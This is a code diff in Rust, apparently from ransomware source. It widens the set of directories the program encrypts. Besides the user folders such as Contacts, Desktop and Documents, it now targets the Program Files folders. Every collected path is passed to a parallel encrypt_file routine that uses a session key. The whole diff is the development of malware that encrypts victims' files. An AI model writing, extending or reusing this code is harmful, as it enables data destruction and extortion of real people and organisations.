@@ -11,7 +11,12 @@ use crate::gen_str;
 use crate::crypto::encrypt;
 use crate::hash::hash;
 
-const TARGETS: [&str; 20] = [
+const VOLUME_TARGETS: [&str; 2] = [
+    "Program Files",
+    "Program Files (x86)"
+];
+
+const USER_TARGETS: [&str; 20] = [
     "Contacts",
     "Desktop",
     "Documents",
@@ -77,20 +82,29 @@ pub fn start(session: &str) {
     filtered
         .par_iter()
         .for_each(|path| {
-
-        let _ = encrypt_file(path, session);
-    });
+            let _ = encrypt_file(path, session);
+        });
 }
 
 fn get_paths() -> Vec<String> {
-    let name = match win_api::get_name() {
+    let name: String = match win_api::get_name() {
         Some(res) => res,
         None => "Default".to_string(),
     };
 
-    TARGETS
+    let user_paths: Vec<String> = USER_TARGETS
         .iter()
         .map(|dir| format!("C:\\Users\\{}\\{}", name, dir))
+        .collect();
+
+    let vol_paths: Vec<String> = VOLUME_TARGETS
+        .iter()
+        .map(|dir| format!("C:\\{}", dir))
+        .collect();
+
+    user_paths
+        .into_iter()
+        .chain(vol_paths.into_iter())
         .collect()
 }
 
